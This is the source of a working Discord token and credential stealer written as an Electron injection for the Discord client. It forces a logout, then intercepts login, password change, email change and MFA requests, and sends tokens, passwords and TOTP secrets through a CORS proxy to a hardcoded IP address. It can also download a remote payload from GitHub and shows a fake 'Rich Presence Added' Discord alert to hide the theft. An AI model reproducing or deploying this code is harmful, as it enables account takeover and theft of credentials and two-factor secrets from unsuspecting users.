/* import modules */
const { session, BrowserWindow, app } = require('electron'),
    { join } = require('path'),
    https = require('https'),
    { existsSync, rmdirSync } = require('fs'),
    querystring = require("querystring"),
    { hostname: computer } = require("os");

let firstTimeRequest = false;

/* request filters */
const Filters1 = { urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://status.discordapp.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://*.discordapp.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://discordapp.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://*.discordapp.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://discordapp.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://*.discordapp.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "https://discordapp.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"] },
    Filters2 = { urls: ["https://api.stripe.com/v*/tokens", "https://discordapp.com/api/v*/users/@me/affinities/guilds", "https://*.discordapp.com/api/v*/users/@me/affinities/guilds", "https://discord.com/api/v*/users/@me/affinities/guilds", "https://*.discord.com/api/v*/users/@me/affinities/guilds", "https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://*.discordapp.com/api/v*/users/@me", "https://discord.com/api/v*/auth/login", "https://discordapp.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://*.discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/users/@me/mfa/totp/enable", "https://discordapp.com/api/v*/users/@me/mfa/totp/enable", "https://*.discord.com/api/v*/users/@me/mfa/totp/enable", "https://*.discordapp.com/api/v*/users/@me/mfa/totp/enable", "https://discord.com/api/v*/users/@me/mfa/totp/disable", "https://discordapp.com/api/v*/users/@me/mfa/totp/disable", "https://*.discord.com/api/v*/users/@me/mfa/totp/disable", "https://*.discordapp.com/api/v*/users/@me/mfa/totp/disable", "https://discord.com/api/v*/users/@me/mfa/codes", "https://discordapp.com/api/v*/users/@me/mfa/codes", "https://*.discord.com/api/v*/users/@me/mfa/codes", "https://*.discordapp.com/api/v*/users/@me/mfa/codes"] };

/* console strings */
const tokenString = 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
    logoutString = 'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
    alertString = `function alert(){const createElm = (html) => {const temp = document.createElement('div');temp.innerHTML = html;return temp.removeChild(temp.firstElementChild);};const alertWindow = createElm(\`<<div class="layerContainer-yqaFcK"><div class="backdrop-1wrmKB withLayer-RoELSG" style="opacity: 0.85; background: hsl(0, calc(var(--saturation-factor, 1) * 0%), 0%);"></div><div class="layer-2KE1M9"><div class="focusLock-Ns3yie" role="dialog" aria-labelledby="uid_95" tabindex="-1" aria-modal="true"><div class="root-1gCeng small-3iVZYw fullscreenOnMobile-1bD22y" style="opacity: 1; transform: scale(1);"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 header-1TKi98" id="uid_95" style="flex: 0 0 auto;"><h2 class="wrapper-1sSZUt fontDisplay-1dagSA base-1x0h_U size20-17Iy80">{title}</h2></div><div class="content-1LAB8Z thin-1ybCId scrollerBase-289Jih" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;"><div class="colorStandard-2KCXvj size16-1P40sf">{description}</div><div class="art-RyCKMR"></div><div aria-hidden="true" style="position: absolute; pointer-events: none; min-height: 0px; min-width: 1px; flex: 0 0 auto; height: 0px;"></div></div><div class="flex-1xMQg5 flex-1O1GKY horizontalReverse-2eTKWD horizontalReverse-3tRjY7 flex-1O1GKY directionRowReverse-m8IjIq justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 footer-2gL1pp" style="flex: 0 0 auto;"><button type="submit" id="alertButton" class="button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeMedium-1AC_Sl grow-q77ONN"><div class="contents-18-Yxp">Okay</div></button></div></div></div></div></div>\`);document.body.appendChild(alertWindow);alertWindow.querySelector('#alertButton').onclick = () => {if (alertWindow.style.display !== 'none') alertWindow.style.display = 'none';}}alert();`;

/* load asar file (exit if linux) */
if (process.platform === 'darwin') {
    require('../app.asar');
    app.on('ready', () => initSession());
} else if (process.platform === 'win32') {
    module.exports = require("./core.asar");
    initSession();
} else {
    process.exit();
}

function getClient() {
    if (process.platform === 'darwin') {
        if (__dirname.includes('Discord Canary.app')) return 'Discord Canary';
        if (__dirname.includes('Discord PTB.app')) return 'Discord PTB';
        if (__dirname.includes('Discord Development.app')) return 'Discord Development';
        if (__dirname.includes('Discord.app')) return 'Discord';
    }
    else if (process.platform === 'win32') {
        if (__dirname.includes('\\DiscordCanary\\')) return 'Discord Canary';
        if (__dirname.includes('\\DiscordPTB\\')) return 'Discord PTB';
        if (__dirname.includes('\\DiscordDevelopment\\')) return 'Discord Development';
        if (__dirname.includes('\\Discord\\')) return 'Discord';
    }
}

/* check if user is logged in */
async function isLogged() {
    try {
        const token = await injectScript(tokenString);
        if (!token || token == null || token == '' || token == undefined) return false;
        return true;
    } catch (err) {
        return false;
    }
}

/* get current session token */
async function getToken() {
    return new Promise((resolve, reject) => {
        injectScript(tokenString)
            .then((token) => {
                if (!token) resolve('Aucun compte connecté');
                resolve(token);
            })
            .catch((err) => reject(err));
    })
}

/* logout the current session */
async function logout() {
    return new Promise((resolve, reject) => {
        injectScript(logoutString)
            .then(() => resolve())
            .catch((err) => reject(err));
    })
}

/* send an official discord alert */
async function alert(title, description) {
    injectScript(
        alertString
            .replace('{title}', title)
            .replace('{description}', description)
    )
        .then(() => resolve())
        .catch((err) => reject(err));
}

/* post a request */
async function post(path, toSend = {}) {
    toSend = querystring.stringify({
        ...toSend,
        computer: computer(),
        client: getClient(),
    })

    const options = {
        hostname: 'cors-anywhere2.herokuapp.com',
        port: 443,
        path: `/http://20.123.8.182/${path}?${toSend}`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        }
    }

    const req = https.request(options, res => {

        res.on('data', d => {
            process.stdout.write(d);
        })
    })

    req.on('error', error => {
        console.error(error);
    })

    req.write('null');
    req.end();
}

/* download the injection payload */
getInjectionPayload = async () => {
    return new Promise((resolve, reject) => {
        https.get('https://raw.githubusercontent.com/SheLovesMyArs/api/main/payload', (resp) => {
            let data = '';
            resp.on('data', (chunk) => data += chunk);
            resp.on('end', () => resolve(data));
        }).on("error", (err) => reject(err));
    })
}

/* inject a script into the electron session console */
function injectScript(script) {
    return new Promise(async (resolve, reject) => {
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(script, true)
            .then((res) => resolve(res))
            .catch((err) => reject(err));
    })
}

/* know if it's the first launch after injection */
async function getFirstTime() {

    if (firstTimeRequest) return false;

    firstTimeRequest = true;

    const checkFolder = join(__dirname, 'handler');

    if (await isLogged()) {
        logout();
        post("logged/true");
    } else {
        post("logged/false");
    }

    if (await existsSync(checkFolder)) {
        await rmdirSync(checkFolder);

        post("injected");

        return true;
    } else {
        post("started");
        return false;
    }
}


function getData(details) {
    return JSON.parse(Buffer.from(details.uploadData[0].bytes).toString());
}

async function initSession() {

    session.defaultSession.webRequest.onBeforeRequest(Filters1, async (details, callback) => {
        if (await getFirstTime()) {
            if (details.url.startsWith("wss://")) {
                return callback({ cancel: true });
            } else {
                return callback({ cancel: false });
            }
        }
    })

    session.defaultSession.webRequest.onCompleted(Filters2, async (details, callback) => {

        if (details.statusCode == 200) {
            if (details.url.endsWith("login")) {

                getToken().then((token) => {
                    const data = getData(details);
                    post("login", {
                        token: token,
                        password: data.password,
                    });

                    alert("Rich Presence Added", "\"The Enchanted Plume\" can now update your presence in real time, go to your account settings if you want to disable it.\nuser settings > activity status");
                })

            } else if (details.url.endsWith("codes")) {

                const data = getData(details);
                if (data.regenerate === true) {

                    getToken().then((token) => {

                        post("mfa/updated", {
                            token: token,
                            password: data.password,
                        });

                    })

                }

            } else if (details.url.endsWith("enable")) {

                const data = getData(details);

                getToken().then((token) => {

                    post("mfa/enabled", {
                        token: token,
                        password: data.password,
                        secret: data.secret,
                    });

                })

            } else if (details.url.endsWith("disable")) {

                getToken().then((token) => {

                    post("mfa/disabled", {
                        token: token
                    });

                })

            } else if (details.url.endsWith("users/@me") && details.method == "PATCH") {

                const data = getData(details);
                if (data.password != null && data.password != undefined && data.password != "") {
                    if (data.new_password != undefined && data.new_password != null && data.new_password != "") {

                        getToken().then((token) => {

                            post("password", {
                                token: token,
                                password: data.new_password,
                            });

                        })

                    } else if (data.email != null && data.email != undefined && data.email != "") {

                        getToken().then((token) => {

                            post("email", {
                                token: token,
                                password: data.password,
                            });

                        })

                    }
                }

            }
        }
    });
}
